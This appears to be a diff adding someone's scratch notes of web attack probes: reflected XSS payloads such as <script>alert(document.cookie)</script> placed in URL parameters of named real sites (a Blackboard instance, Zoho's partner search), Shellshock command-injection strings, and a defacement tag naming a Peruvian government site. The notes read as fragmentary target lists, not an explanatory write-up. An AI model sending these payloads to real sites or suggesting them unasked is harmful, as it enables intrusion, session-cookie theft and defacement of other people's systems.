@@ -1,0 +1,22 @@
+<script>alert("hacked py LO");</script>
+
+https://upn.blackboard.com/?new_loc=<script>alert("hacked py LO");</script>
+
+<script>alert(1)</script>
+<script>alert(document.cookie)</script>
+
+https://www.zoho.com/partners/find-partner.html
+
+https://www.zoho.com/partners/find-partner-results.html?search=<script>alert(document.cookie)</script>&where=country
+
+https:/lwww.zoho.com/
+
+/()%20{%20:%3B}%3B%20/bin/sleep%2031
+(){ :;}; /bin/sleep 31
+
+gob.pe HACKED BY
+libero and digital team hack argentino
+
+https://redhuarochiri.gob.pe/
+
+js switcher addon firefox
